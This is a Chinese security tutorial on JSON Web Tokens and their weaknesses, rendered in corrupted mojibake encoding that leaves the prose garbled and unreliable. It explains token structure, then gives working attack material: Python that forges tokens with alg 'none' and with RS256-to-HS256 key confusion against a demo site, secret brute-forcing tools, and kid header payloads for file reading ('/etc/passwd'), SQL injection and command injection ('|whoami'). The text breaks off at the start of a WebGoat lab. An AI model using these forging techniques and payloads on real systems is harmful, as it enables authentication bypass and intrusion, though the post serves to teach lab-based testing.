è¾“ä¿¡æ¯ã€‚å®ƒé€šå¸¸ç”¨äºèº«ä»½éªŒè¯å’Œæˆæƒã€‚JWTç”±ä¸‰ä¸ªéƒ¨åˆ†ç»„æˆï¼šå¤´éƒ¨ã€è½½è·å’Œç­¾åã€‚ ä½œä¸º JSON å¯¹è±¡åœ¨å„æ–¹ä¹‹é—´å®‰å…¨åœ°ä¼ è¾“ä¿¡æ¯ã€‚è¯¥ä¿¡æ¯å¯ä»¥è¢«éªŒè¯å’Œä¿¡ä»»ï¼Œå› ä¸ºå®ƒæ˜¯æ•°å­—ç­¾åçš„ã€‚ è€ŒJWTä¸€èˆ¬æ˜¯ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼Œå¹¶ä½¿ç”¨base64ç¼–ç ã€‚ä»¥ä¸‹ä¸ºå®Œæ•´çš„JWTè®¤è¯ä¿¡æ¯ï¼š JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlRpbWUifQ.2YosC1XgEHYbLonkRpX49gi3Lqnr4dngsThwnBGvhwA eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9 //æ ‡å¤´ eyJ1c2VybmFtZSI6IlRpbWUifQ //payload 2YosC1XgEHYbLonkRpX49gi3Lqnr4dngsThwnBGvhwA //ç­¾å Header(æ ‡å¤´) æ ‡å¤´é€šå¸¸ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼šä»¤ç‰Œçš„ç±»å‹å’Œæ‰€ä½¿ç”¨çš„ç­¾åç®—æ³•ï¼Œä¾‹å¦‚HMACSHA256æˆ–RSAã€‚ Headerå¤´éƒ¨æ‰¿è½½ä¸¤éƒ¨åˆ†ä¿¡æ¯ï¼Œåˆ†åˆ«æ˜¯å£°æ˜ç±»å‹ï¼šJWT å’Œ å£°æ˜åŠ å¯†ç®—æ³•ï¼š header = '{ \"alg\":\"HS256\", \"typ\":\"JWT\" }' ä½¿ç”¨base64URLç¼–ç ï¼Œå½¢æˆJWTçš„ç¬¬ä¸€éƒ¨åˆ†ã€‚ Payload(æœ‰æ•ˆè½½è·) ä¸»ä½“ä¿¡æ¯(æœ‰æ•ˆè½½è·)ï¼Œå…¶ä¸­åŒ…å«å£°æ˜ï¼Œå£°æ˜æ˜¯æœ‰å…³å®ä½“(ä¸€èˆ¬æ˜¯ç”¨æˆ·)å’Œå…¶ä»–æ•°æ®çš„å£°æ˜ã€‚ç´¢èµ”æœ‰ä»¥ä¸‹ä¸‰ç§ç±»å‹ï¼šæ³¨å†Œçš„ï¼Œå…¬å…±çš„å’Œç§äººæƒåˆ©ï¼›ç®€å•æ¥è¯´å°±æ˜¯ï¼šæ³¨å†Œå£°æ˜ã€å…¬å…±å£°æ˜å’Œç§æœ‰å£°æ˜ã€‚ æ³¨ï¼šè¿™é‡Œå°±æœ‰å¯èƒ½å­˜åœ¨ä¿¡æ¯æ³„éœ²ï¼Œé»˜è®¤æƒ…å†µä¸‹jwtæ˜¯æœªåŠ å¯†çš„ï¼Œåœ¨è¿›è¡Œè§£ç æ—¶å°±å¯ä»¥æŸ¥çœ‹åˆ°ä¸€äº›æ•æ„Ÿä¿¡æ¯ å·²æ³¨å†Œçš„æƒåˆ©è¦æ±‚ï¼šè¿™æ˜¯ä¸€ç»„éå¼ºåˆ¶æ€§çš„ä½†å»ºè®®ä½¿ç”¨çš„é¢„å®šä¹‰æƒåˆ©è¦æ±‚ï¼Œä»¥æä¾›ä¸€ç»„æœ‰ç”¨çš„å¯äº’æ“ä½œçš„æƒåˆ©è¦æ±‚ã€‚å…¶ä¸­ä¸€äº›æ˜¯ï¼šiss(ä¸»é¢˜)ï¼Œ exp(åˆ°æœŸæ—¶é—´)ï¼Œ sub(ä¸»é¢˜)ï¼Œ aud(å—ä¼—)ç­‰ã€‚ å…¬å¼€å£°æ˜ï¼šä½¿ç”¨JWTçš„äººå‘˜å¯ä»¥éšæ„å®šä¹‰è¿™äº›å£°æ˜ã€‚ä½†ä¸ºé¿å…å†²çªï¼Œåº”åœ¨IANA JSON Webä»¤ç‰Œæ³¨å†Œè¡¨ä¸­å®šä¹‰å®ƒä»¬ï¼Œæˆ–å°†å…¶å®šä¹‰ä¸ºåŒ…å«æŠ—å†²çªåç§°ç©ºé—´çš„URIã€‚ ç§äººæƒåˆ©ï¼šæ˜¯æŒ‡ä½¿ç”¨å®ƒä»¬åŒæ„ï¼Œå¹¶ä¸”ä¸æ˜¯å½“äº‹äººä¹‹é—´çš„ï¼Œå»ºç«‹å…±äº«ä¿¡æ¯çš„è‡ªå®šä¹‰å£°æ˜æ³¨å†Œï¼Œæˆ–è€…å…¬ä¼—çš„æƒåˆ©è¦æ±‚ã€‚ å®˜æ–¹è§„å®šçš„ä¸ƒä¸ªå­—æ®µ(ä¸å¼ºåˆ¶è¦æ±‚é€‰æ‹©ï¼Œä¹Ÿå¯ä»¥è‡ªå®šä¹‰å­—æ®µ)ï¼š â€“ iss (issuer)ï¼šç­¾å‘äºº â€“ exp (expiration time)ï¼šè¿‡æœŸæ—¶é—´ â€“ sub (subject)ï¼šä¸»é¢˜ â€“ aud (audience)ï¼šå—ä¼— â€“ nbf (Not Before)ï¼šç”Ÿæ•ˆæ—¶é—´ â€“ iat (Issued At)ï¼šç­¾å‘æ—¶é—´ â€“ jti (JWT ID)ï¼šç¼–å· payload = '{ \"loggedInAs\":\"admin\", \"iat\":1422779638 }'//iatè¡¨ç¤ºä»¤ç‰Œç”Ÿæˆçš„æ—¶é—´ //ä½¿ç”¨base64URLç¼–ç ï¼Œå½¢æˆJWTçš„ç¬¬äºŒéƒ¨åˆ†ã€‚ è¿™é‡Œæ„Ÿè§‰ä¸Šè¿°çš„è§£é‡Šæœ‰ç‚¹æŠ½è±¡ï¼Œæˆ‘å€Ÿç”¨å…¶ä»–æ–‡ç« çš„è§£é‡Šæ¥è¿›ä¸€æ­¥ç†è§£ å…¬å…±å£°æ˜(Public Claims)ï¼šæ˜¯è‡ªå®šä¹‰çš„å­—æ®µï¼Œç”¨äºä¼ é€’éæ•æ„Ÿä¿¡æ¯ï¼Œä¾‹å¦‚:ç”¨æˆ·IDã€è§’è‰²ç­‰ ç§æœ‰å£°æ˜(Private Claims)ï¼šæ˜¯è‡ªå®šä¹‰çš„å­—æ®µï¼Œç”¨äºä¼ é€’æ•æ„Ÿä¿¡æ¯ï¼Œä¾‹å¦‚å¯†ç ã€ä¿¡ç”¨å¡å·ç­‰ æ³¨å†Œå£°æ˜(Registered Claims)ï¼šé¢„å®šä¹‰çš„æ ‡å‡†å­—æ®µï¼ŒåŒ…å«äº†ä¸€äº›JWTçš„å…ƒæ•°æ®ä¿¡æ¯ï¼Œä¾‹å¦‚:å‘è¡Œè€…ã€è¿‡æœŸæ—¶é—´ç­‰ Signature(ç­¾å) ç­¾åï¼Œè¦åˆ›å»ºç­¾åéƒ¨åˆ†ï¼Œå¿…é¡»è·å–ç¼–ç çš„æ ‡å¤´ã€ç¼–ç çš„æœ‰æ•ˆè½½è·ã€æœºå¯†ã€æ ‡å¤´ä¸­æŒ‡å®šçš„ç®—æ³•ï¼Œå¹¶å¯¹å…¶è¿›è¡Œç­¾åã€‚ å¦‚æœè¦ä½¿ç”¨HMAC SHA256ç®—æ³•ï¼Œåˆ™å°†é€šè¿‡ä»¥ä¸‹æ–¹å¼åˆ›å»ºç­¾åï¼š HMACSHA256( #ç¬¬ä¸€éƒ¨åˆ† base64UrlEncode(header) + \".\" + #ç¬¬äºŒéƒ¨åˆ† base64UrlEncode(payload), #ç§˜é’¥ secret) //å³ Signature = HMACSHA256(base64UrlEncode(header) + \".\" + base64UrlEncode(payload),\"secret\") //secretä¿å­˜åœ¨åç«¯ï¼Œå°±æ˜¯æ¥è§£æç¡®å®šéªŒè¯çš„key ä½¿ç”¨base64Urlç¼–ç åç»„æˆç¬¬ä¸‰éƒ¨åˆ†ï¼Œæœ€åå°†ç¬¬ä¸€éƒ¨åˆ†ã€ç¬¬äºŒéƒ¨åˆ†ã€ç¬¬ä¸‰éƒ¨åˆ†ä½¿ç”¨â€œ.â€è¿æ¥ç»„æˆä¸€æ®µå®Œæ•´çš„JWTä»¤ç‰Œã€‚ ç­¾åç”Ÿæˆæµç¨‹ é¦–å…ˆéœ€è¦æŒ‡å®šä¸€ä¸ªsecretï¼ˆæ˜¯ç”¨äºç­¾åå’ŒéªŒè¯çš„å¯†é’¥ï¼‰ï¼Œè¯¥secretä»…ä»…ä¿å­˜åœ¨æœåŠ¡å™¨ä¸­ï¼Œä¿è¯ä¸èƒ½è®©å…¶ä»–ç”¨æˆ·çŸ¥é“ è¿™ä¸ªéƒ¨åˆ†éœ€è¦ base64URL åŠ å¯†åçš„ headeå’Œbase64URL åŠ å¯†åçš„ payloadä½¿ç”¨.è¿æ¥ç»„æˆçš„å­—ç¬¦ä¸² é€šè¿‡headerä¸­å£°æ˜çš„åŠ å¯†ç®—æ³•è¿›è¡ŒåŠ å¯†secretç»„åˆåŠ å¯† å¾—å‡ºä¸€ä¸ªç­¾åå“ˆå¸Œï¼Œå°±æ˜¯Signatureï¼Œä¸”æ— æ³•åå‘è§£å¯† Pythonç”ŸæˆJwt Web Tokenï¼š import time import jwt #å¤´ä¿¡æ¯ head = { \"alg\":\"HS256\", \"typ\":\"jwt\" } #payload payloda = { \"iat\":time.time(), \"name\":\"admin\" } #è°ƒç”¨jwtåº“ï¼Œç”Ÿæˆjson web token #ç§˜é’¥ï¼ŒåŠ å¯†ç®—æ³• jwt_token = jwt.encode(payload,\"1121\",algorithm=\"HS256\",headers=head) #è¾“å‡º print(jwt_token) ç”Ÿæˆtokenå¦‚ä¸‹ï¼š pythonè§£å¯†JWT import jwt #éœ€è¦è§£ç çš„token jwt_token = \"eyJhbGciOiJIUzI1NiIsInR5cCI6Imp3dCJ9.eyJpYXQiOjE3MDkwMjkxNzYuODY2ODkwMiwibmFtZSI6ImFkbWluIn0.Krq4e2UHaTCpWwCm00bZYPimiQxtl004Y98BOy9-Xo0\" data = None try: #ç§˜é’¥ data = jwt.decode(jwt_token,\"1121\",algorithms=\"HS256\") except Exception as e: print(e) print(data) 0x02 JWTå·¥ä½œæµç¨‹ ç”¨æˆ·ä½¿ç”¨è´¦å·ã€å¯†ç ç™»å½•åº”ç”¨ï¼Œç™»å½•çš„è¯·æ±‚å‘é€åˆ° Authentication Serverï¼ˆèº«ä»½éªŒè¯æœåŠ¡å™¨ï¼‰ã€‚ Authentication Server è¿›è¡Œç”¨æˆ·éªŒè¯ï¼Œç„¶ååˆ›å»º JWT å­—ç¬¦ä¸²è¿”å›ç»™å®¢æˆ·ç«¯ã€‚ å®¢æˆ·ç«¯è¯·æ±‚æ¥å£æ—¶ï¼Œåœ¨è¯·æ±‚å¤´å¸¦ä¸Š JWTã€‚ Application Server éªŒè¯ JWT åˆæ³•æ€§ï¼Œå¦‚æœåˆæ³•åˆ™ç»§ç»­è°ƒç”¨åº”ç”¨æ¥å£è¿”å›ç»“æœã€‚ çŸ¥è¯†è¡¥å…… JWSï¼šå³JSON Web Signatureï¼ŒSigned JWTï¼Œç­¾åè¿‡çš„JWT JWEï¼šEncrypted JWTéƒ¨åˆ†payloadç»è¿‡åŠ å¯†çš„JWT JWKï¼šJWTçš„å¯†é’¥ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¸¸è¯´çš„SECRET JKUï¼šJKU(JSON Web Key Set URL)æ˜¯JWT Headerä¸­çš„ä¸€ä¸ªå­—æ®µï¼Œå­—æ®µå†…å®¹æ˜¯ä¸€ä¸ªURIï¼Œè¯¥URIç”¨äºæŒ‡å®šç”¨äºéªŒè¯ä»¤ç‰Œç§˜é’¥çš„æœåŠ¡å™¨ï¼Œè¯¥æœåŠ¡å™¨ç”¨äºå›å¤JWK å¯†é’¥åŸºæœ¬äº†è§£ symmetricï¼šå¯¹ç§°å¯†é’¥ RSAï¼šå…¬é’¥å¯†ç  ECCï¼šæ˜¯ä¸€ç§åŸºäºæ¤­åœ†æ›²çº¿æ•°å­¦åŸç†çš„åŠ å¯†ç®—æ³•ï¼Œå…¶å¯†é’¥ç”±ä¸€å¯¹(å…¬é’¥ã€ç§é’¥)ç»„æˆ OKPï¼ˆOctet Key Pairï¼‰å¯†é’¥æ˜¯ä¸€ç§ç”¨äºåŠ å¯†å’Œèº«ä»½éªŒè¯çš„å…¬é’¥å¯†ç å­¦å¯†é’¥å¯¹ã€‚å®ƒåŸºäºæ¤­åœ†æ›²çº¿å¯†ç å­¦ï¼ˆElliptic Curve Cryptographyï¼ŒECCï¼‰ç®—æ³•ï¼Œä¸ä¼ ç»Ÿçš„RSAï¼ˆRivest-Shamir-ï¼‰ Adlemanï¼‰åŠ å¯†ç®—æ³•ä¸åŒã€‚ 0x03 æ”»å‡»æ‰‹æ³• æ•æ„Ÿä¿¡æ¯æ³„éœ² å› headerå’Œpayloadéƒ¨åˆ†æ˜¯ä½¿ç”¨å¯é€†çš„base64æ–¹æ³•ç¼–ç ï¼Œæ‰€ä»¥åªè¦è·å–åˆ°ä»¤ç‰Œï¼Œå°±å¯ä»¥å°†å‰ä¸¤ä¸ªéƒ¨åˆ†è§£å¯†åè¯»å–å†…å®¹ è§£å¯†æ–¹æ³•ï¼š //Linux base64 echo eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9 | base64 -d //è¾“å‡ºï¼š{\"typ\":\"JWT\",\"alg\":\"HS256\"} æµè§ˆå™¨JavaScriptæ§åˆ¶å°ï¼š atob(\"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9\") //è¾“å‡ºï¼š\"{\"typ\":\"JWT\",\"alg\":\"HS256\"}\" Powershellï¼š [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9\")) //è¾“å‡ºï¼š{\"typ\":\"JWT\",\"alg\":\"HS256\"} Pythonï¼š import base64 print(base64.b64decode('eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9')) //è¾“å‡ºï¼š{\"typ\":\"JWT\",\"alg\":\"HS256\"} å½“ç„¶ä¹Ÿå¯ä»¥åˆ©ç”¨åœ¨çº¿å·¥å…· ä¿®æ”¹ç­¾åç®—æ³•(none) JWTç­¾åç®—æ³•å¯ç¡®ä¿JWTåœ¨ä¼ è¾“è¿‡ç¨‹ä¸­ä¸ä¼šè¢«æ¶æ„ç”¨æˆ·æ‰€ç¯¡æ”¹ï¼Œä½†å¤´éƒ¨çš„algå­—æ®µå¯ä»¥æ”¹ä¸ºnoneï¼Œè‹¥æœåŠ¡å™¨æ”¯æŒç­¾åç®—æ³•ä¸ºnoneï¼ŒæœåŠ¡å™¨ä¼šåœ¨JWTä¸­åˆ é™¤ç›¸åº”çš„ç­¾åæ•°æ®ï¼ˆè¿™æ—¶ï¼ŒJWTå°±ä¼šåªå«æœ‰å¤´éƒ¨ + â€˜.â€™ + æœ‰æ•ˆè½½è· + â€˜.â€™ï¼‰ï¼Œç„¶åå°†å…¶æäº¤ç»™æœåŠ¡å™¨ã€‚ å¯ä»¥çœ‹ä¸‹é¢çš„å°ç»ƒä¹ ï¼Œé¡¹ç›®åœ°å€ï¼šhttps://github.com/Sjord/jwtdemo å¯¹åº”çš„åœ¨çº¿ç½‘å€ï¼šhttp://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php å¯ä»¥å°†ä¸Šé¢æ˜¾ç¤ºçš„JWTè¾“å…¥åˆ°æ–‡æœ¬æ¡†ï¼Œç‚¹å‡»å‘é€ã€‚è¿™é‡Œè¯¥ç½‘ç«™åº”è¯¥æ˜¯å……å½“èº«ä»½éªŒè¯æœåŠ¡å™¨ï¼Œæ£€éªŒå‘é€çš„JWTçš„åˆæ³•æ€§ å‘é€ä¹‹åï¼Œå¦‚ä¸Šå›¾å‘ç°JWTè¢«æˆåŠŸè§£æï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥å°†algä¿®æ”¹ä¸ºnone import time import jwt #å¤´ä¿¡æ¯ head = { \"alg\":\"none\", \"typ\":\"JWT\" } #payload payload = { \"iat\":time.time(), \"name\":\"admin\" } #è°ƒç”¨jwtåº“ï¼Œç”Ÿæˆjson web token #ç§˜é’¥ï¼ŒåŠ å¯†ç®—æ³• jwt_token = jwt.encode(payload,\"\",algorithm=\"HS256\",headers=head) #è¾“å‡ºeyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpYXQiOjE3MDkwMzA5MDkuNTIwODQ2LCJuYW1lIjoiYWRtaW4ifQ. print(jwt_token) å†æ¬¡å‘é€ä¹‹åå¦‚ä¸‹å›¾ï¼š ä¿®æ”¹RSAåŠ å¯†ç®—æ³•ä¸ºHMAC ä¸Šè¿°ä¹Ÿå¯ä»¥è¯´æ˜¯ï¼šä¿®æ”¹RS256ç®—æ³•ä¸ºHS256 HMACä¹Ÿå°±æ˜¯å¯†é’¥ç›¸å…³çš„å“ˆå¸Œè¿ç®—æ¶ˆæ¯è®¤è¯ç ï¼ˆHash-based Message Authentication Codeï¼‰çš„ç¼©å†™ï¼Œå®ƒæ˜¯ä¸€ç§å¯¹ç§°åŠ å¯†ç®—æ³•ï¼Œä½¿ç”¨ç›¸åŒçš„å¯†é’¥å¯¹ä¼ è¾“ä¿¡æ¯è¿›è¡ŒåŠ è§£å¯†ã€‚ RSAä¹Ÿå°±æ˜¯RS256ç®—æ³•åˆ™ä½¿ç”¨ç§é’¥å¯¹æ¶ˆæ¯è¿›è¡Œç­¾åå¹¶ä½¿ç”¨å…¬é’¥è¿›è¡Œèº«ä»½éªŒè¯ã€‚ åœ¨HMACå’ŒRSAç®—æ³•ä¸­ï¼Œéƒ½æ˜¯ä½¿ç”¨ç§é’¥å¯¹signatureå­—æ®µè¿›è¡Œç­¾åï¼Œåªæœ‰æ‹¿åˆ°äº†åŠ å¯†æ—¶ä½¿ç”¨çš„ç§é’¥ï¼Œæ‰æœ‰å¯èƒ½ä¼ªé€ tokenã€‚ ç°åœ¨æˆ‘ä»¬å‡è®¾æœ‰è¿™æ ·ä¸€ç§æƒ…å†µï¼Œä¸€ä¸ªWebåº”ç”¨ï¼Œåœ¨JWTä¼ è¾“è¿‡ç¨‹ä¸­ä½¿ç”¨RSAç®—æ³•ï¼Œå¯†é’¥pemå¯¹JWT tokenè¿›è¡Œç­¾åï¼Œå…¬é’¥pubå¯¹ç­¾åè¿›è¡ŒéªŒè¯ã€‚ { \"alg\" : \"RS256\", \"typ\" : \"jwt\" } é€šå¸¸æƒ…å†µä¸‹å¯†é’¥pemæ˜¯æ— æ³•è·å–åˆ°çš„ï¼Œä½†æ˜¯å…¬é’¥pubå´å¯ä»¥å¾ˆå®¹æ˜“é€šè¿‡æŸäº›é€”å¾„è¯»å–åˆ°ï¼Œè¿™æ—¶ï¼Œå°†JWTçš„åŠ å¯†ç®—æ³•ä¿®æ”¹ä¸ºHMACï¼Œå³ { \"alg\" : \"HS256\", \"typ\" : \"jwt\" } åŒæ—¶ä½¿ç”¨è·å–åˆ°çš„å…¬é’¥pubä½œä¸ºç®—æ³•çš„å¯†é’¥ï¼Œå¯¹tokenè¿›è¡Œç­¾åï¼Œå‘é€åˆ°æœåŠ¡å™¨ç«¯ã€‚ æœåŠ¡å™¨ç«¯ä¼šå°†RSAçš„å…¬é’¥ï¼ˆpubï¼‰è§†ä¸ºå½“å‰ç®—æ³•ï¼ˆHMACï¼‰çš„å¯†é’¥ï¼Œä½¿ç”¨HS256ç®—æ³•å¯¹æ¥æ”¶åˆ°çš„ç­¾åè¿›è¡ŒéªŒè¯ã€‚ åœ¨çº¿ç»ƒä¹ åœ°å€ï¼šhttp://demo.sjoerdlangkemper.nl/jwtdemo/rs256.php å…¬é’¥è·å–åœ°å€ï¼šhttp://demo.sjoerdlangkemper.nl/jwtdemo/public.pem è·å–å…¬é’¥å¦‚ä¸‹ï¼š -----BEGIN PUBLIC KEY----- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqi8TnuQBGXOGx/Lfn4JF NYOH2V1qemfs83stWc1ZBQFCQAZmUr/sgbPypYzy229pFl6bGeqpiRHrSufHug7c 1LCyalyUEP+OzeqbEhSSuUss/XyfzybIusbqIDEQJ+Yex3CdgwC/hAF3xptV/2t+ H6y0Gdh1weVKRM8+QaeWUxMGOgzJYAlUcRAP5dRkEOUtSKHBFOFhEwNBXrfLd76f ZXPNgyN0TzNLQjPQOy/tJ/VFq8CQGE4/K5ElRSDlj4kswxonWXYAUVxnqRN1LGHw 2G5QRE2D13sKHCC8ZrZXJzj67Hrq5h2SADKzVzhA8AW3WZlPLrlFT3t1+iZ6m+aF KwIDAQAB -----END PUBLIC KEY----- æ¥ç€å°†ç®—æ³•æ”¹ä¸ºHS256ç„¶åä½¿ç”¨æ³„éœ²çš„å…¬é’¥è¿›è¡Œç­¾åï¼ŒæœåŠ¡å™¨ä¼šä½¿ç”¨HS256å’Œæ³„éœ²çš„å…¬é’¥è¿›è¡ŒéªŒè¯ã€‚ import time import jwt key = [ \"-----BEGIN PUBLIC KEY-----\", \"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqi8TnuQBGXOGx/Lfn4JF\", \"NYOH2V1qemfs83stWc1ZBQFCQAZmUr/sgbPypYzy229pFl6bGeqpiRHrSufHug7c\", \"1LCyalyUEP+OzeqbEhSSuUss/XyfzybIusbqIDEQJ+Yex3CdgwC/hAF3xptV/2t+\", \"H6y0Gdh1weVKRM8+QaeWUxMGOgzJYAlUcRAP5dRkEOUtSKHBFOFhEwNBXrfLd76f\", \"ZXPNgyN0TzNLQjPQOy/tJ/VFq8CQGE4/K5ElRSDlj4kswxonWXYAUVxnqRN1LGHw\", \"2G5QRE2D13sKHCC8ZrZXJzj67Hrq5h2SADKzVzhA8AW3WZlPLrlFT3t1+iZ6m+aF\", \"KwIDAQAB\", \"-----END PUBLIC KEY-----\" ] key = \" \".join(key) payload = { \"name\":\"admin\" } #è°ƒç”¨jwtåº“ï¼Œç”Ÿæˆjson web token #ç§˜é’¥,åŠ å¯†ç®—æ³• jwt_token = jwt.encode(payload,algorithm=\"HS256\",key=key+\" \") #è¾“å‡º print(jwt_token) è¿™é‡Œè¿è¡Œä¹‹åå‘ç°æŠ¥é”™ å‘ç°æŠ¥é”™å‘ç”Ÿåœ¨268ï¼Œè·Ÿè¸ªçœ‹çœ‹ å‘ç°è¿™é‡Œä¼šè°ƒç”¨å‡½æ•°æ£€æŸ¥keyæ˜¯å¦åˆæ³•ï¼ˆæœ‰æ•ˆï¼‰ï¼Œçœ‹äº†å…¶ä»–æ–‡ç« å‘ç°ç›´æ¥æ³¨é‡Šå³å¯ï¼Œä¹‹åæˆåŠŸç”Ÿæˆï¼šeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4ifQ.pbbcYFOp6TyFXNa36PmpoArpNMc8jjSoJA0LsAuUcCQ å‘ç½‘ç«™å‘é€JWTå‘ç°æˆåŠŸè§£æ çˆ†ç ´å¯†é’¥ è¿™é‡Œæ–¹æ³•ä¼¼ä¹è¿˜æŒºå¤šï¼Œä¸€ä¸ªä¸ªæ¥ èƒ½è¿›è¡Œçˆ†ç ´å¯†é’¥çš„å‰æï¼š çŸ¥æ‚‰JWTä½¿ç”¨çš„åŠ å¯†ç®—æ³• ä¸€æ®µæœ‰æ•ˆçš„ã€å·²ç­¾åçš„token ç­¾åç”¨çš„å¯†é’¥ä¸å¤æ‚ï¼ˆå¼±å¯†é’¥ï¼‰ ä¾‹å¦‚å°†å¯†é’¥å­—ç¬¦ä¸²ç”¨ä½œPyJWTåº“ç¤ºä¾‹ä»£ç ä¸­çš„å¯†é’¥çš„æ—¶å€™ï¼Œæƒ…å†µå°±æ˜¯å¦‚æ­¤ã€‚æ‰€ä»¥å…¶å®JWT å¯†é’¥çˆ†ç ´çš„å±€é™æ€§å¾ˆå¤§ã€‚ çˆ†ç ´è„šæœ¬åœ°å€ï¼šhttps://github.com/Devllench/jwtbruteâ€”â€”ç»“æœè¿™ä¸ªé¡¹ç›®æ— äº†ã€‚ã€‚ã€‚æ—¢ç„¶æ— äº†ï¼Œå°±çœ‹å…¶ä»–å·¥å…·äº† å­—å…¸åœ°å€ï¼šhttps://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt å¦ä¸€ä¸ªå¼ºå¤§å·¥å…·ï¼šc-jwt-cracker ä¸‹é¢æ˜¯ä¸€äº›å®ä¾‹ å¯ä»¥çœ‹åˆ°ç®€å•çš„å­—æ¯æ•°å­—ç»„åˆéƒ½æ˜¯å¯ä»¥çˆ†ç ´çš„ï¼Œä½†æ˜¯å¯†é’¥ä½æ•°ç¨å¾®é•¿ä¸€ç‚¹æˆ–è€…æ›´å¤æ‚ä¸€ç‚¹çš„è¯ï¼Œçˆ†ç ´æ—¶é—´å°±ä¼šéœ€è¦å¾ˆä¹…ã€‚ ä¿®æ”¹KIDå‚æ•° kidæ˜¯jwt headerä¸­çš„ä¸€ä¸ªå¯é€‰å‚æ•°ï¼Œå…¨ç§°æ˜¯key IDï¼Œå®ƒç”¨äºæŒ‡å®šåŠ å¯†ç®—æ³•çš„å¯†é’¥ { \"alg\" : \"HS256\", \"typ\" : \"jwt\", \"kid\" : \"/home/jwt/.ssh/pem\" } å› ä¸ºè¯¥å‚æ•°å¯ä»¥ç”±ç”¨æˆ·è¾“å…¥ï¼Œæ‰€ä»¥ä¹Ÿå¯èƒ½é€ æˆä¸€äº›å®‰å…¨é—®é¢˜ã€‚ ä»»æ„æ–‡ä»¶è¯»å– kidå‚æ•°ç”¨äºè¯»å–å¯†é’¥æ–‡ä»¶ï¼Œä½†ç³»ç»Ÿå¹¶ä¸ä¼šçŸ¥é“ç”¨æˆ·æƒ³è¦è¯»å–çš„åˆ°åº•æ˜¯ä¸æ˜¯å¯†é’¥æ–‡ä»¶ï¼Œæ‰€ä»¥ï¼Œå¦‚æœåœ¨æ²¡æœ‰å¯¹å‚æ•°è¿›è¡Œè¿‡æ»¤çš„å‰æä¸‹ï¼Œæ”»å‡»è€…æ˜¯å¯ä»¥è¯»å–åˆ°ç³»ç»Ÿçš„ä»»æ„æ–‡ä»¶çš„ã€‚ { \"alg\" : \"HS256\", \"typ\" : \"jwt\", \"kid\" : \"/etc/passwd\" } SQLæ³¨å…¥ kidä¹Ÿå¯ä»¥ä»æ•°æ®åº“ä¸­æå–æ•°æ®ï¼Œè¿™æ—¶å€™å°±æœ‰å¯èƒ½é€ æˆSQLæ³¨å…¥æ”»å‡»ï¼Œé€šè¿‡æ„é€ SQLè¯­å¥æ¥è·å–æ•°æ®æˆ–è€…æ˜¯ç»•è¿‡signatureçš„éªŒè¯ { \"alg\" : \"HS256\", \"typ\" : \"jwt\", \"kid\" : \"key11111111' || union select 'secretkey' -- \" } å‘½ä»¤æ³¨å…¥ å¯¹kidå‚æ•°è¿‡æ»¤ä¸ä¸¥ä¹Ÿå¯èƒ½ä¼šå‡ºç°å‘½ä»¤æ³¨å…¥é—®é¢˜ï¼Œä½†æ˜¯åˆ©ç”¨æ¡ä»¶æ¯”è¾ƒè‹›åˆ»ã€‚å¦‚æœæœåŠ¡å™¨åç«¯ä½¿ç”¨çš„æ˜¯Rubyï¼Œåœ¨è¯»å–å¯†é’¥æ–‡ä»¶æ—¶ä½¿ç”¨äº†openå‡½æ•°ï¼Œé€šè¿‡æ„é€ å‚æ•°å°±å¯èƒ½é€ æˆå‘½ä»¤æ³¨å…¥ã€‚ \"/path/to/key_file|whoami\" å¯¹äºå…¶ä»–çš„è¯­è¨€ï¼Œä¾‹å¦‚phpï¼Œå¦‚æœä»£ç ä¸­ä½¿ç”¨çš„æ˜¯execæˆ–è€…æ˜¯systemæ¥è¯»å–å¯†é’¥æ–‡ä»¶ï¼Œé‚£ä¹ˆåŒæ ·ä¹Ÿå¯ä»¥é€ æˆå‘½ä»¤æ³¨å…¥ï¼Œå½“ç„¶è¿™ä¸ªå¯èƒ½æ€§å°±æ¯”è¾ƒå°äº†ã€‚ ä¿®æ”¹JKU/X5Uå‚æ•° JKUçš„å…¨ç§°æ˜¯\"JSON Web Key Set URL\"ï¼Œç”¨äºæŒ‡å®šä¸€ç»„ç”¨äºéªŒè¯ä»¤ç‰Œçš„å¯†é’¥çš„URLã€‚ç±»ä¼¼äºkidï¼ŒJKUä¹Ÿå¯ä»¥ç”±ç”¨æˆ·æŒ‡å®šè¾“å…¥æ•°æ®ï¼Œå¦‚æœæ²¡æœ‰ç»è¿‡ä¸¥æ ¼è¿‡æ»¤ï¼Œå°±å¯ä»¥æŒ‡å®šä¸€ç»„è‡ªå®šä¹‰çš„å¯†é’¥æ–‡ä»¶ï¼Œå¹¶æŒ‡å®šwebåº”ç”¨ä½¿ç”¨è¯¥ç»„å¯†é’¥æ¥éªŒè¯tokenã€‚ X5Uåˆ™ä»¥URIçš„å½¢å¼æ•°å…è®¸æ”»å‡»è€…æŒ‡å®šç”¨äºéªŒè¯ä»¤ç‰Œçš„å…¬é’¥è¯ä¹¦æˆ–è¯ä¹¦é“¾ï¼Œä¸JKUçš„æ”»å‡»åˆ©ç”¨æ–¹å¼ç±»ä¼¼ã€‚ 0x04 å®æ“ç»ƒä¹  WebGoaté¶åœº å…³å¡ä¸€ 